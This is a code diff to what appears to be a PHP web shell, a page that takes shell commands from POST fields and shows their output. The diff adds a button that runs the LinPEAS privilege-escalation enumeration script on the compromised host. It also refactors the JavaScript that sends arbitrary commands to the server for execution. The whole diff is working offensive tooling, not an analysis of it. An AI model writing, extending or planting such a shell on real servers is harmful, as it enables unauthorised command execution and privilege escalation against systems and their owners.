@@ -892,6 +892,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                         ANSI&nbsp;Colors:
                     </label>
                     <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
+                    <label>Quick&nbsp;Commands:</label>
+                    <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1')">Run&nbsp;LinPEAS</button>
                 </div>
             </div>
             <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
@@ -909,49 +911,60 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
 
 <script>
     document.getElementById('cmdInput').addEventListener('keydown', function (e) {
-        /* CMD input function */
         if (e.key === 'Enter') {
             const cmd = this.value.trim();
-            if (!cmd) return;
-
-            const cmdOutputEl = document.getElementById('cmdOutput');
-
-            // Handle 'clear' locally
-            if (cmd === 'clear') {
-                cmdOutputEl.textContent = '';
-                this.value = '';
-                return;
-            }
-
-            const method = document.getElementById('cmdMethod').value;
-            const path = document.getElementsByClassName('selectedPath')[0].value || '/';
-            const ansiColors = document.getElementById('cmdInputColors').checked;
-
-            fetch(window.location.pathname, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({
-                    exec_cmd: cmd,
-                    exec_method: method,
-                    exec_path: path,
-                    use_ansi: ansiColors ? '1' : '0'
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                const timestamp = new Date().toLocaleTimeString();
-                const output = data.success
-                    ? `${timestamp} $ ${cmd}\n${data.output.trim()}\n\n`
-                    : `${timestamp} $ ${cmd}\nError: ${data.error}\n\n`;
-
-                cmdOutputEl.innerHTML = output + cmdOutputEl.innerHTML;
-                e.target.value = '';
-            })
-            .catch(err => {
-                cmdOutputEl.innerHTML = `\nError: ${err.message}\n` + cmdOutputEl.innerHTML;
-            });
+            executeShellCommand(cmd);
+            this.value = ''; // Clear input
         }
     });
+
+    function executeShellCommand(cmd) {
+        if (!cmd.trim()) return;
+
+        const cmdOutputEl = document.getElementById('cmdOutput');
+        const method = document.getElementById('cmdMethod').value;
+        const pathEl = document.getElementsByClassName('selectedPath')[0];
+        const path = pathEl?.value || '/';
+        const ansiColors = document.getElementById('cmdInputColors').checked;
+
+        // Handle 'clear' locally
+        if (cmd === 'clear') {
+            cmdOutputEl.textContent = '';
+            return;
+        }
+
+        fetch(window.location.pathname, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams({
+                exec_cmd: cmd,
+                exec_method: method,
+                exec_path: path,
+                use_ansi: ansiColors ? '1' : '0'
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            const timestamp = new Date().toLocaleTimeString();
+            const output = data.success
+                ? `${timestamp} $ ${cmd}\n${data.output.trim()}\n\n`
+                : `${timestamp} $ ${cmd}\nError: ${data.error}\n\n`;
+
+            if (ansiColors) {
+                cmdOutputEl.innerHTML = output + cmdOutputEl.innerHTML;
+            } else {
+                cmdOutputEl.textContent = output + cmdOutputEl.textContent;
+            }
+        })
+        .catch(err => {
+            const errorMsg = `\nError: ${err.message}\n`;
+            if (ansiColors) {
+                cmdOutputEl.innerHTML = errorMsg + cmdOutputEl.innerHTML;
+            } else {
+                cmdOutputEl.textContent = errorMsg + cmdOutputEl.textContent;
+            }
+        });
+    }
 
     function refreshFolder(path, targetElement) {
         /* REFRESH FOLDER THAT IS CALLED */
